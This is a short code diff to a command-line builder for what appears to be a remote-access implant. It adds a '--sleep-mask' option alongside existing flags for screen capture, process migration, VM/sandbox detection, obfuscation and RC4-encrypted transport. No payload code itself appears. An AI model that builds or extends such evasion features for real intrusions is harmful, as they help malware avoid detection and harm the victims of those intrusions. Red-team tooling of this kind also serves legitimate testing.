@@ -204,6 +204,7 @@ def _cmd_build_payload(args: argparse.Namespace) -> int:
         screenshot=args.screenshot,
         migration=not args.no_migration,
         anti_analysis=args.anti_analysis,
+        sleep_mask=args.sleep_mask,
         obfuscation=args.obfuscation,
         rc4_key=args.rc4_key,
     )
@@ -324,6 +325,7 @@ def add_subcommands(parser: argparse.ArgumentParser) -> None:
     p_build.add_argument("--screenshot", action="store_true", help="Compile in screen capture")
     p_build.add_argument("--no-migration", action="store_true", help="Omit process migration")
     p_build.add_argument("--anti-analysis", action="store_true", help="Compile in VM/sandbox detection (off by default)")
+    p_build.add_argument("--sleep-mask", action="store_true", help="Mask the last command output in memory while the agent sleeps (off by default)")
     p_build.add_argument("--obfuscation", choices=["none", "light", "medium", "heavy"], default=None,
                          help="Source-level obfuscation level (default: none)")
     p_build.add_argument("--rc4-key", default="", help="RC4 transport key (empty = plaintext wire)")
